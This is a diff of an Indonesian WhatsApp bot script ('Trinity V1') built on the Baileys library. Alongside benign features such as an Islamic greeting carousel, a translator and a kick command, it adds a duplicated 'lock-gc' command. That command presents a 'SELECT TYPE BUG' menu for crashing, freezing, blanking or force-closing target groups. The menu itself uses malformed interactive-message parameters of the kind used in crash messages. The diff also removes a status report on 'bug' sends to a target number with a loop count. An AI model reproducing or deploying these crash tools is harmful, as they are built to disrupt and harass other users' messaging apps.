+            console.error("Gagal memproses/mengirim VN:", e);
+        } finally {
+            // Menghapus file sampah hasil konversi setelah dikirim
+            if (fs.existsSync(output)) {
+                fs.unlinkSync(output);
+            }
+        }
+    }
 }
-
-if (!adaError) {
-    replybug2(
-`⏤ *[ 𝗧𝗥𝗜𝗡𝗜𝗧𝗬 𝗩𝟭 ]* ⏤
-ᯓ Function : ${funcName}
-ᯓ Target : ${nomor}
-ᯓ Loop : ${jumlah}
-ᯓ Status : Success ✅
-`
-    );
-}
-
 break;
-}
 
-// Case Bak Grup
+case "lock-gc": {
+    // Menghitung waktu 1 jam ke depan dalam format Unix Timestamp
+    const oneHourLater = Math.floor(Date.now() / 1000) + 3600;
+    
+    // Validasi fitur khusus pengguna premium
+    
+    // Mengambil ID Grup Target dari argumen pertama
+    let TargeT = args[0];
+    if (!TargeT) {
+        return payreply("⚠️ *Silakan pilih grup dari menu!*");
+    }
+    
+    const namaOrang = m.pushName || "No Name";
+    const user = "" + namaOrang;
+    let trash = "";
+    let zero = "\n╭─⤉ [ BUG TYPE ]\n│    Please click the Bug Menu Options\n╰─────────────────";
+    
+    // Fungsi internal otomatis pengacak indeks pembatas tombol
+    const fixShuffle = (arr) => arr.sort(() => Math.random() - 0.5);
+    
+    // 1. Mengirimkan Pesan Interaktif (Menu Bug & Tombol Navigasi)
+    await Asepp.sendMessage(m.chat, {
+        interactiveMessage: {
+            title: trash,
+            footer: zero,
+            thumbnail: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1781083243624.jpeg",
+            nativeFlowMessage: {
+                messageParamsJson: JSON.stringify({
+                    limited_time_offer: {
+                        text: "☬⃟⃰𝐆⃠⃢𝐫𝐨⃖🇺𝐩⃠⃡𝐄𝐱𝔮𝐞𝐜𝐮⃕𝐭𝐢𝐨𝐧⃛𝐬⃢ꦽ🐉",
+                        url: "https://t.me",
+                        copy_code: "./AsepOkeGas.json",
+                        expiration_time: Date.now() * 999
+                    },
+                    bottom_sheet: {
+                        in_thread_buttons_limit: 2,
+                        divider_indices: fixShuffle([3, 4, 5, 999, 1, 2]),
+                        list_title: "SELECT TYPE BUG",
+                        button_title: "SELECT TYPE BUG"
+                    },
+                    tap_target_configuration: {
+                        title: "▸ X ◄",
+                        description: "Exposloods Gen2 Htraasch",
+                        canonical_url: "https://t.me",
+                        domain: "https://asepxyz12.github.io/bot-wa-db/hosting/AseppXyz%20-%20Developer.html",
+                        button_index: 0
+                    }
+                }),
+                buttons: [
+                    {
+                        name: "single_select",
+                        buttonParamsJson: JSON.stringify({
+                            has_multiple_buttons: true
+                        }),
+                        icon: "REVIEW"
+                    }, 
+                    {
+                        name: "call_permission_request",
+                        buttonParamsJson: JSON.stringify({
+                            has_multiple_buttons: true
+                        })
+                    }, 
+                    {
+                        name: "single_select",
+                        buttonParamsJson: JSON.stringify({
+                            icon: "PROMOTION",
+                            title: "SELECT TYPE BUG",
+                            sections: [{
+                                title: "Trashvhe Ggoup Exceuton",
+                                rows: [
+                                    {
+                                        title: "Forclose Group",
+                                        description: "Forclose Hard Group",
+                                        id: ".force-group " + TargeT
+                                    }, 
+                                    {
+                                        title: "Forclose Group VII",
+                                        description: "Forclose Infinity Group",
+                                        id: ".force-groupv2 " + TargeT
+                                    }, 
+                                    {
+                                        title: "Crash Blank Group",
+                                        description: "Blank Ui Hard Group",
+                                        id: ".blank-group " + TargeT
+                                    }, 
+                                    {
+                                        title: "Crash Group Invited",
+                                        description: "Crash Fake Invited Group",
+                                        id: ".xinvite-group " + TargeT
+                                    }, 
+                                    {
+                                        title: "Crash V Freeze Group",
+                                        description: "Freeze X Crash Buffer Group",
+                                        id: ".blankv2-group " + TargeT
+                                    }, 
+                                    {
+                                        title: "Trashvhe Core Lay",
+                                        description: "Blank X Delay Group",
+                                        id: ".blankv3-group " + TargeT
+                                    }, 
+                                    {
+                                        title: "Crash DocmentMessege",
+                                        description: "Crash Document Message",
+                                        id: ".blankv4-group " + TargeT
+                                    }, 
+                                    {
+                                        title: "Rxvxs Burst Bvg",
+                                        description: "Burst Damage Group",
+                                        id: ".blankv5-group " + TargeT
+                                    }, 
+                                    {
+                                        title: "Crash Loca Bvgs",
+                                        description: "Loca Crash Delay Bvg Group",
+                                        id: ".blankv6-group " + TargeT
+                                    }, 
+                                    {
+                                        title: "Coooling Freeze",
+                                        description: "Freeze Chat Group",
+                                        id: ".core-group " + TargeT
+                                    }, 
+                                    {
+                                        title: "Freeze Hard Level",
+                                        description: "Freeze Chat X Delay X Forclose UI",
+                                        id: ".crash-group " + TargeT
+                                    }, 
+                                    {
+                                        title: "Invited Admin Bokep",
+                                        description: "Crash Group Type Invite Admin",
+                                        id: ".admin-bokep " + TargeT
+                                    }
+                                ]
+                            }]
+                        }),
+                        icon: "DOCUMENT"
+                    }, 
+                    {
+                        name: "cta_url",
+                        buttonParamsJson: JSON.stringify({
+                            icon: "DOCUMENT",
+                            display_text: "Join Saluran Informasi",
+                            url: "https://whatsapp.com"
+                        })
+                    }, 
+                    {
+                        name: "cta_copy",
+                        buttonParamsJson: JSON.stringify({
+                            icon: "DEFAULT",
+                            display_text: "Using Website",
+                            copy_code: "https://vercel.app"
+                        })
+                    }, 
+                    {
+                        name: "cta_call",
+                        buttonParamsJson: JSON.stringify({
+                            display_text: "Call Developer",
+                            phone_number: "0881036109288"
+                        })
+                    }, 
+                    {
+                        name: "cta_reminder",
+                        buttonParamsJson: JSON.stringify({
+                            display_text: "Thanks To Buyer Trinity",
+                            id: "https://t.me",
+                            timestamp: oneHourLater,
+                            note: "Halo! Ini pengingat dari AsepXyz untuk tugas kamu"
+                        })
+                    }, 
+                    {
+                        name: "send_location",
+                        buttonParamsJson: "{}"
+                    }
+                ]
+            }
+        }
+    }, { quoted: m }); // Diubah ke 'm' agar tidak ReferenceError
+
+    // 2. Memproses Konversi Audio Master ke OGG/Opus (Voice Note)
+    const input = "./Start.opus";
+    const output = path.join(__dirname, "./tmp_convert_" + Date.now() + ".ogg");
+    
+    if (fs.existsSync(input)) {
+        try {
+            await new Promise((resolve, reject) => {
+                // Konversi audio menggunakan ffmpeg agar terbaca sebagai Voice Note asli di WhatsApp
+                exec("ffmpeg -y -i " + input + " -vn -map_metadata -1 -ac 1 -ar 48000 -c:a libopus -b:a 64k " + output, err => {
+                    return err ? reject(err) : resolve();
+                });
+            });
+            
+            // Mengirimkan Voice Note ke ruang obrolan
+            await Asepp.sendMessage(m.chat, {
+                audio: fs.readFileSync(output),
+                mimetype: "audio/ogg; codecs=opus",
+                ptt: true,
+                contextInfo: {
+                    forwardingScore: 0,
+                    isForwarded: false
+                }
+            }, { quoted: m }); // Diubah ke 'm' agar tidak ReferenceError
+            
+        } catch (e) {
+            console.error(e);
+        } finally {
+            // Menghapus file sampah hasil konversi setelah dikirim
+            if (fs.existsSync(output)) {
+                fs.unlinkSync(output);
+            }
+        }
+    }
+}
+break;
+
+
+
+case "lock-gc": {
+    // Menghitung waktu 1 jam ke depan dalam format Unix Timestamp
+    const oneHourLater = Math.floor(Date.now() / 1000) + 3600;
+    
+    // Mengambil ID Grup Target dari argumen pertama
+    let TargeT = args[0];
+    if (!TargeT) {
+        return payreply("⚠️ *Silakan pilih grup dari menu!*");
+    }
+    
+    const namaOrang = m.pushName || "No Name";
+    const user = "" + namaOrang;
+    let trash = "";
+    let zero = "\n╭─⤉ [ BUG TYPE ]\n│    Please click the Bug Menu Options\n╰─────────────────";
+    
+    // Fungsi internal otomatis pengacak indeks pembatas tombol
+    const fixShuffle = (arr) => arr.sort(() => Math.random() - 0.5);
+    
+    // Dibungkus try-catch agar jika Axios/Link Error, bot tidak langsung mati
+    try {
+        // 1. Mengirimkan Pesan Interaktif (Menu Bug & Tombol Navigasi)
+        await Asepp.sendMessage(m.chat, {
+            interactiveMessage: {
+                title: trash,
+                footer: zero,
+                // Tips: Ganti URL ini dengan URL gambar lain yang aktif jika github masih error
+                thumbnail: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1781083243624.jpeg",
+                nativeFlowMessage: {
+                    messageParamsJson: JSON.stringify({
+                        limited_time_offer: {
+                            text: "☬⃟⃰𝐆⃠⃢𝐫𝐨⃖🇺𝐩⃠⃡𝐄𝐱𝔮𝐞𝐜𝐮⃕𝐭𝐢𝐨𝐧⃛𝐬⃢ꦽ🐉",
+                            url: "https://t.me",
+                            copy_code: "./AsepOkeGas.json",
+                            expiration_time: Date.now() * 999
+                        },
+                        bottom_sheet: {
+                            in_thread_buttons_limit: 2,
+                            divider_indices: fixShuffle([3, 4, 5, 999, 1, 2]),
+                            list_title: "SELECT TYPE BUG",
+                            button_title: "SELECT TYPE BUG"
+                        },
+                        tap_target_configuration: {
+                            title: "▸ X ◄",
+                            description: " AsepXyzOkeGas",
+                            canonical_url: "https://t.me/AsepXxnx",
+                            domain: "https://asepxyz12.github.io/bot-wa-db/hosting/AseppXyz%20-%20Developer.html",
+                            button_index: 0
+                        }
+                    }),
+                    buttons: [
+                        {
+                            name: "single_select",
+                            buttonParamsJson: JSON.stringify({ has_multiple_buttons: true }),
+                            icon: "REVIEW"
+                        }, 
+                        {
+                            name: "call_permission_request",
+                            buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
+                        }, 
+                        {
+                            name: "single_select",
+                            buttonParamsJson: JSON.stringify({
+                                icon: "PROMOTION",
+                                title: "SELECT TYPE BUG",
+                                sections: [{
+                                    title: "Trashvhe Ggoup Exceuton",
+                                    rows: [
+                                        { title: "Forclose Group", description: "Forclose Hard Group", id: ".pornoclose " + TargeT }, 
+                                        { title: "Forclose Group VII", description: "Forclose Infinity Group", id: ".pornoclose " + TargeT }, 
+                                        { title: "Crash Blank Group", description: "Blank Ui Hard Group", id: ".pornoclose " + TargeT }, 
+                                        { title: "Crash Group Invited", description: "Crash Fake Invited Group", id: ".pornoclose " + TargeT }, 
+                                        { title: "Crash V Freeze Group", description: "Freeze X Crash Buffer Group", id: ".pornoclose " + TargeT }, 
+                                        { title: "Trashvhe Core Lay", description: "Blank X Delay Group", id: ".pornoclose " + TargeT }, 
+                                        { title: "Crash DocmentMessege", description: "Crash Document Message", id: ".pornoclose " + TargeT }, 
+                                        { title: "Rxvxs Burst Bvg", description: "Burst Damage Group", id: ".pornoclose " + TargeT }, 
+                                        { title: "Crash Loca Bvgs", description: "Loca Crash Delay Bvg Group", id: ".pornoclose " + TargeT }, 
+                                        { title: "Coooling Freeze", description: "Freeze Chat Group", id: ".pornoclose " + TargeT }, 
+                                        { title: "Freeze Hard Level", description: "Freeze Chat X Delay X Forclose UI", id: ".pornoclose " + TargeT }, 
+                                        { title: "Invited Admin Bokep", description: "Crash Group Type Invite Admin", id: ".pornoclose " + TargeT }
+                                    ]
+                                }]
+                            }),
+                            icon: "DOCUMENT"
+                        }, 
+                        {
+                            name: "cta_url",
+                            buttonParamsJson: JSON.stringify({
+                                icon: "DOCUMENT",
+                                display_text: "Join Saluran Informasi",
+                                url: "https://whatsapp.com"
+                            })
+                        }, 
+                        {
+                            name: "cta_copy",
+                            buttonParamsJson: JSON.stringify({
+                                icon: "DEFAULT",
+                                display_text: "Using Website",
+                                copy_code: "https://vercel.app"
+                            })
+                        }, 
+                        {
+                            name: "cta_call",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Call Developer",
+                                phone_number: "0881036109288"
+                            })
+                        }, 
+                        {
+                            name: "cta_reminder",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Thanks To Buyer Trinity",
+                                id: "https://t.me/AsepXxnx",
+                                timestamp: oneHourLater,
+                                note: "Halo! Ini pengingat dari AsepXyz untuk tugas kamu"
+                            })
+                        }, 
+                        {
+                            name: "send_location",
+                            buttonParamsJson: "{}"
+                        }
+                    ]
+                }
+            }
+        }, { quoted: m });
+    } catch (interactiveError) {
+        console.error("Gagal mengirim pesan interaktif karena masalah jaringan/aset:", interactiveError);
+        // Fallback: Kirim teks biasa jika tombol native flow error
+        await Asepp.sendMessage(m.chat, { text: "⚠️ Fitur menu tombol sedang bermasalah. Mengalihkan ke sistem audio..." }, { quoted: m });
+    }
+
+    // 2. Memproses Konversi Audio Master ke OGG/Opus (Voice Note)
+    const input = "./Start.opus";
+    const output = path.join(__dirname, "./tmp_convert_" + Date.now() + ".ogg");
+    
+    if (fs.existsSync(input)) {
+        try {
+            await new Promise((resolve, reject) => {
+                // Konversi audio menggunakan ffmpeg agar terbaca sebagai Voice Note asli di WhatsApp
+                exec("ffmpeg -y -i " + input + " -vn -map_metadata -1 -ac 1 -ar 48000 -c:a libopus -b:a 64k " + output, err => {
+                    return err ? reject(err) : resolve();
+                });
+            });
+            
+            // Mengirimkan Voice Note ke ruang obrolan
+            await Asepp.sendMessage(m.chat, {
+                audio: fs.readFileSync(output),
+                mimetype: "audio/ogg; codecs=opus",
+                ptt: true,
+                contextInfo: {
+                    forwardingScore: 0,
+                    isForwarded: false
+                }
+            }, { quoted: m });
+            
+        } catch (e) {
+            console.error("Gagal memproses/mengirim VN:", e);
+        } finally {
+            // Menghapus file sampah hasil konversi setelah dikirim
+            if (fs.existsSync(output)) {
+                fs.unlinkSync(output);
+            }
+        }
+    }
+}
+break;
+
 case 'trinity-killgroup':
 case 'trinity-blankgroup': {
     if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
@@ -8694,7 +11046,7 @@ case "iqc": {
  const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=INDOSAT&messageText=${encodeURIComponent(pesan)}&emojiStyle=apple`;
  
  try {
- // 4. Ganti 'client' jadi 'Asepp' sesuai variabel botmu
+ // 4. Ganti 'Asepp' jadi 'Asepp' sesuai variabel botmu
  await Asepp.sendMessage(m.chat, {
  image: { url },
  caption: "*_iPhone Quoted Message TrinityVersion1_*"
@@ -8706,93 +11058,139 @@ case "iqc": {
 }
 break;
 
+
 case 'assalamualaikum':
 case 'assalam':
 case 'asalam':
 case 'aslm': {
- // 1. Persiapan Media Gambar tiap Kartu
- const media1 = await prepareWAMessageMedia(
- { image: { url: "https://img2.pixhost.to/images/7322/716834527_asepp.jpg" } },
- { upload: Asepp.waUploadToServer }
- );
+  try {
+    const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = require("@whiskeysockets/baileys")
 
- const media2 = await prepareWAMessageMedia(
- { image: { url: "https://img2.pixhost.to/images/7322/716834533_asepp.jpg" } },
- { upload: Asepp.waUploadToServer }
- );
+    // 1. Persiapan Media Gambar tiap Kartu secara presisi
+    const media1 = await prepareWAMessageMedia(
+      { image: { url: "https://img2.pixhost.to/images/7322/716834527_asepp.jpg" } },
+      { upload: Asepp.waUploadToServer }
+    )
 
- // 2. Kirim via relayMessage agar Carousel Aktif
- await Asepp.relayMessage(from, {
- viewOnceMessage: {
- message: {
- interactiveMessage: {
- body: {
- text: `*Wa'alaikumussalam Warahmatullahi Wabarakatuh*\n\n` +
- `_"Sebarkanlah salam di antara kalian, niscaya kalian akan saling mencintai."_ (HR. Muslim)\n\n` +
- `Berikut adalah kumpulan dalil dan hadits lengkap mengenai keutamaan salam. *Silakan geser kartu* untuk membaca lebih banyak! 👇`
- },
- footer: {
- text: "Asepp System • Library Hadits Salam"
- },
- header: {
- hasMediaAttachment: false
- },
- carouselMessage: {
- cards: [
- {
- header: {
- title: "📜 KUMPULAN HADITS SALAM (1)",
- hasMediaAttachment: true,
- ...media1
- },
- body: {
- text: `1. *Pahala Sempurna:* Mengucap salam lengkap (Wabarakatuh) dicatat 30 kebaikan. (HR. Tirmidzi)\n` +
- `2. *Amalan Terbaik:* Memberi makan & mengucap salam pada yang dikenal/tidak. (HR. Bukhari)\n` +
- `3. *Penggugur Dosa:* Bersalaman saat bertemu menggugurkan dosa sebelum berpisah. (HR. Abu Daud)\n` +
- `4. *Utama di Sisi Allah:* Orang yang paling utama adalah yang memulai salam. (HR. Abu Daud)\n` +
- `5. *Kunci Surga:* Sebarkan salam, beri makan, shalat malam = Surga. (HR. Ibnu Majah)\n` +
- `6. *Keberkahan Rumah:* Salam saat masuk rumah membawa berkah bagi penghuninya. (HR. Tirmidzi)\n` +
- `7. *Hak Muslim:* Menjawab salam adalah salah satu dari 6 hak muslim. (HR. Muslim)\n` +
- `8. *Salam di Majelis:* Ucapkan salam saat datang dan saat berpamitan. (HR. Tirmidzi)`
- },
- nativeFlowMessage: {
- buttons: [{
- name: "quick_reply",
- buttonParamsJson: JSON.stringify({ display_text: "Masya Allah", id: "salam1" })
- }]
- }
- },
- {
- header: {
- title: "📖 ADAB & DALIL QURAN (2)",
- hasMediaAttachment: true,
- ...media2
- },
- body: {
- text: `• *Aturan Berpapasan:* Yang berkendara salam ke yang berjalan, yang berjalan ke yang duduk, yang sedikit ke yang banyak. (HR. Bukhari)\n` +
- `• *Kepada Anak-anak:* Rasulullah ﷺ selalu memberi salam pada anak kecil yang dilewatinya. (HR. Muslim)\n` +
- `• *Perintah Quran:* "Apabila kamu dihormati dengan suatu salam, maka balaslah dengan yang lebih baik." (QS. An-Nisa: 86)\n` +
- `• *Salam Penghuni Surga:* "Dan malaikat masuk ke tempat mereka dari semua pintu (sambil berkata): Salamun 'Alaikum." (QS. Ar-Ra'd: 23-24)\n` +
- `• *Nama Allah:* 'As-Salam' adalah salah satu nama Allah yang diletakkan di bumi. (HR. Bukhari)\n` +
- `• *Mengusir Setan:* Setan tidak bisa ikut menginap di rumah yang salamnya diucapkan. (HR. Muslim)\n` +
- `• *Jaminan Keamanan:* Salam adalah janji keamanan antar sesama muslim.`
- },
- nativeFlowMessage: {
- buttons: [{
- name: "quick_reply",
- buttonParamsJson: JSON.stringify({ display_text: "Subhanallah", id: "salam2" })
- }]
- }
- }
- ]
- }
- }
- }
- }
- }, { quoted: m });
+    const media2 = await prepareWAMessageMedia(
+      { image: { url: "https://img2.pixhost.to/images/7322/716834533_asepp.jpg" } },
+      { upload: Asepp.waUploadToServer }
+    )
+
+    // Teks pengantar utama di luar kartu
+    let mainText = `*Wa'alaikumussalam Warahmatullahi Wabarakatuh*\n\n` +
+      `_"Sebarkanlah salam di antara kalian, niscaya kalian akan saling mencintai."_ (HR. Muslim)\n\n` +
+      `Berikut adalah kumpulan dalil dan hadits lengkap mengenai keutamaan salam. *Silakan geser kartu* untuk membaca lebih banyak! 👇`
+
+    // 2. Kontrol perakitan payload pesan dengan skema proto resmi
+    let msgii = await generateWAMessageFromContent(
+      m.chat,
+      {
+        viewOnceMessage: {
+          message: {
+            messageContextInfo: { 
+              deviceListMetadata: {}, 
+              deviceListMetadataVersion: 2 
+            },
+            interactiveMessage: proto.Message.InteractiveMessage.create({
+              body: proto.Message.InteractiveMessage.Body.create({ 
+                text: mainText 
+              }),
+              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+                cards: [
+                  // ---- CARD SLIDE 1 (KUMPULAN HADITS SALAM) ----
+                  {
+                    header: proto.Message.InteractiveMessage.Header.create({
+                      title: "📜 KUMPULAN HADITS SALAM (1)",
+                      hasMediaAttachment: true,
+                      ...media1
+                    }),
+                    body: proto.Message.InteractiveMessage.Body.create({
+                      text: `1. *Pahala Sempurna:* Mengucap salam lengkap (Wabarakatuh) dicatat 30 kebaikan. (HR. Tirmidzi)\n` +
+                            `2. *Amalan Terbaik:* Memberi makan & mengucap salam pada yang dikenal/tidak. (HR. Bukhari)\n` +
+                            `3. *Penggugur Dosa:* Bersalaman saat bertemu menggugurkan dosa sebelum berpisah. (HR. Abu Daud)\n` +
+                            `4. *Utama di Sisi Allah:* Orang yang paling utama adalah yang memulai salam. (HR. Abu Daud)\n` +
+                            `5. *Kunci Surga:* Sebarkan salam, beri makan, shalat malam = Surga. (HR. Ibnu Majah)\n` +
+                            `6. *Keberkahan Rumah:* Salam saat masuk rumah membawa berkah bagi penghuninya. (HR. Tirmidzi)\n` +
+                            `7. *Hak Muslim:* Menjawab salam adalah salah satu dari 6 hak muslim. (HR. Muslim)\n` +
+                            `8. *Salam di Majelis:* Ucapkan salam saat datang dan saat berpamitan. (HR. Tirmidzi)`
+                    }),
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                      messageParamsJson: JSON.stringify({
+                        limited_time_offer: { text: "HADITS SALAM", url: "https://t.me", copy_code: "SALAM", expiration_time: Date.now() + 86400000 },
+                        bottom_sheet: { 
+                          in_thread_buttons_limit: 0, // Mengunci angka 0 agar tombol rapi masuk panel bawah
+                          list_title: "Hadits Options", 
+                          button_title: "Open Menu" 
+                        }
+                      }),
+                      buttons: [
+                        { 
+                          name: "quick_reply", 
+                          buttonParamsJson: JSON.stringify({ 
+                            icon: "PROMOTION", // Menyisipkan ikon kustom agar tidak burik
+                            display_text: "Masya Allah", 
+                            id: "salam1" 
+                          }) 
+                        }
+                      ]
+                    })
+                  },
+                  // ---- CARD SLIDE 2 (ADAB & DALIL QURAN) ----
+                  {
+                    header: proto.Message.InteractiveMessage.Header.create({
+                      title: "📖 ADAB & DALIL QURAN (2)",
+                      hasMediaAttachment: true,
+                      ...media2
+                    }),
+                    body: proto.Message.InteractiveMessage.Body.create({
+                      text: `• *Aturan Berpapasan:* Yang berkendara salam ke yang berjalan, yang berjalan ke yang duduk, yang sedikit ke yang banyak. (HR. Bukhari)\n` +
+                            `• *Kepada Anak-anak:* Rasulullah ﷺ selalu memberi salam pada anak kecil yang dilewatinya. (HR. Muslim)\n` +
+                            `• *Perintah Quran:* "Apabila kamu dihormati dengan suatu salam, maka balaslah dengan yang lebih baik." (QS. An-Nisa: 86)\n` +
+                            `• *Salam Penghuni Surga:* "Dan malaikat masuk ke tempat mereka dari semua pintu (sambil berkata): Salamun 'Alaikum." (QS. Ar-Ra'd: 23-24)\n` +
+                            `• *Nama Allah:* 'As-Salam' adalah salah satu nama Allah yang diletakkan di bumi. (HR. Bukhari)\n` +
+                            `• *Mengusir Setan:* Setan tidak bisa ikut menginap di rumah yang salamnya diucapkan. (HR. Muslim)\n` +
+                            `• *Jaminan Keamanan:* Salam adalah janji keamanan antar sesama muslim.`
+                    }),
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                      messageParamsJson: JSON.stringify({
+                        limited_time_offer: { text: "ADAB & DALIL", url: "https://t.me", copy_code: "DALIL", expiration_time: Date.now() + 86400000 },
+                        bottom_sheet: { 
+                          in_thread_buttons_limit: 0, // Mengunci angka 0 agar tombol rapi masuk panel bawah
+                          list_title: "Adab Options", 
+                          button_title: "Open Menu" 
+                        }
+                      }),
+                      buttons: [
+                        { 
+                          name: "quick_reply", 
+                          buttonParamsJson: JSON.stringify({ 
+                            icon: "DOCUMENT", // Menyisipkan ikon kustom agar tidak burik
+                            display_text: "Subhanallah", 
+                            id: "salam2" 
+                          }) 
+                        }
+                      ]
+                    })
+                  }
+                ]
+              })
+            })
+          }
+        }
+      },
+      { quoted: m }
+    )
+
+    // 3. Kirim via relayMessage asli Baileys tanpa tumpang tindih parameter
+    await Asepp.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
+
+  } catch (e) {
+    console.log(e)
+    payreply(`Gagal memuat: ${e.message}`)
+  }
 }
-break;
-
+break
 
 
 
@@ -9004,7 +11402,7 @@ case 'delakses': {
 }
 break
 
-case 'menugh':
+
 
 
 
@@ -9084,7 +11482,7 @@ Hi \`${pushname}\` 👋 Ini semua group yang udah lu tandain buat akses GH DB �
  hasMediaAttachment: true,
  videoMessage: (
  await prepareWAMessageMedia(
- { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778781640228.mp4" } },
+ { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1780748833328.mp4" } },
  { upload: Asepp.waUploadToServer }
  )
  ).videoMessage,
@@ -9438,6 +11836,14 @@ break
 case "kick":
 case "kik":
 case "dor": {
+
+ // =====================================
+ // OWNER ONLY
+ // =====================================
+ if (!isOwner) {
+ return payreply('❌ Owner only!')
+ }
+
  if (!m.isGroup) return payreply(mess.group)
  if (!m.quoted && !m.mentionedJid?.length && !text)
  return payreply("Reply / tag orang yang mau dikick")
@@ -9547,7 +11953,7 @@ case 'deteksi': {
  let tujuan = text? text.toLowerCase() : 'id'
 
  try {
- let res = await fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${tujuan}&dt=t&q=${encodeURIComponent(teks)}`)
+ let res = await fetch(`https://translate.googleapis.com/translate_a/single?Asepp=gtx&sl=auto&tl=${tujuan}&dt=t&q=${encodeURIComponent(teks)}`)
  let json = await res.json()
 
  let hasil = json[0].map(v => v[0]).join('')
@@ -9583,7 +11989,7 @@ case 'deteksi': {
  if (dari === tujuan) {
  tujuan = dari === 'en'? 'id' : 'en'
  namaTujuan = langName[tujuan]
- let res2 = await fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${tujuan}&dt=t&q=${encodeURIComponent(teks)}`)
+ let res2 = await fetch(`https://translate.googleapis.com/translate_a/single?Asepp=gtx&sl=auto&tl=${tujuan}&dt=t&q=${encodeURIComponent(teks)}`)
  let json2 = await res2.json()
  hasil = json2[0].map(v => v[0]).join('')
  }
@@ -12987,6 +15393,369 @@ atau yang Engkau ajarkan kepada salah satu makhluk-Mu, atau yang Engkau turunkan
 \`[☝️] 𝐋𝐀 𝐈𝐋𝐀𝐇𝐀 𝐈𝐋𝐀𝐋𝐋𝐀𝐇 [☝️]\`
 `
 
+  const msg = generateWAMessageFromContent(
+  m.chat,
+  {
+   viewOnceMessage: {
+    message: {
+     messageContextInfo: {
+      deviceListMetadata: {},
+      deviceListMetadataVersion: 2
+     },
+     interactiveMessage: proto.Message.InteractiveMessage.create({
+      body: proto.Message.InteractiveMessage.Body.create({
+       text: "𝐀𝐋𝐋𝐀𝐇 𝐏𝐄𝐍𝐂𝐈𝐍𝐓𝐀 𝐀𝐋𝐀𝐌 𝐁𝐑𝐄"
+      }),
+      contextInfo: {
+       isForwarded: true,
+       forwardingScore: 999,
+       forwardedNewsletterMessageInfo: {
+        newsletterJid: '120363418538598013@newsletter',
+        newsletterName: '𝐀𝐒𝐌𝐀𝐔𝐋 𝐇𝐔𝐒𝐍𝐀',
+        serverMessageId: 145
+       }
+      },
+      // Mengubah struktur utama menu menjadi format Carousel Message Card
+      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+       cards: [
+        {
+         // FIX PERMANENT AUTO-PLAY: Parameter gifPlayback dikunci menempel di Header Card Carousel
+         header: proto.Message.InteractiveMessage.Header.create({
+          title: "",
+          gifPlayback: true,
+          hasMediaAttachment: true,
+          videoMessage: (
+           await prepareWAMessageMedia(
+            { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778781922256.mp4" }, gifPlayback: true },
+            { upload: Asepp.waUploadToServer }
+           )
+          ).videoMessage
+         }),
+         footer: proto.Message.InteractiveMessage.Footer.create({
+          text: teks
+         }),
+         nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+           messageParamsJson: JSON.stringify({
+            limited_time_offer: {
+             text: "𝐀𝐋𝐋𝐀𝐇",
+             url: `https://quran.com`,
+             copy_code: "SUBHANALLAH",
+             expiration_time: Date.now() + 86400000
+            },
+            bottom_sheet: {
+             in_thread_buttons_limit: 1, // Mengunci sisa tombol agar bersembunyi rapi di dalam panel pop-up Bottom Sheet
+             divider_indices: [],
+             list_title: "Bab Tauhid",
+             button_title: "© TENTANG ALLAH" // Judul tombol pemicu panel di luar card
+            }
+           }),
+           // MODIFIKASI TOTAL: Mengubah single_select list menjadi deretan tombol quick_reply berikon variatif
+           buttons: [
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "PROMOTION",
+              display_text: "Tauhid 3 Macam",
+              id: `${prefix}allah`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "DOCUMENT",
+              display_text: "Asmaul Husna 99",
+              id: `${prefix}allah`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "REVIEW",
+              display_text: "Sifat Wajib 20",
+              id: `${prefix}allah`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "DEFAULT",
+              display_text: "Hak Allah atas Hamba",
+              id: `${prefix}allah`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "PROMOTION",
+              display_text: "Nikmat Allah",
+              id: `${prefix}allah`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "DOCUMENT",
+              display_text: "Yang Membatalkan",
+              id: `${prefix}allah`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "REVIEW",
+              display_text: "Amalan Mendekat",
+              id: `${prefix}allah`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "DEFAULT",
+              display_text: "Ayat Kursi",
+              id: `${prefix}allah`
+             })
+            }
+           ]
+          })
+        }
+       ]
+      })
+     })
+    }
+   }
+  },
+  { quoted: m }
+ )
+
+ await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
+
+ await Asepp.sendMessage(
+  m.chat,
+  {
+   audio: fs.readFileSync("./image/kcwa.mp3"),
+   mimetype: "audio/mp4",
+   ptt: false
+  },
+  { quoted: m }
+ )
+}
+break
+
+case 'asmaulhusna':
+case 'tauhid': {
+ await Asepp.sendMessage(m.chat, { react: { text: "☝️", key: m.key } })
+
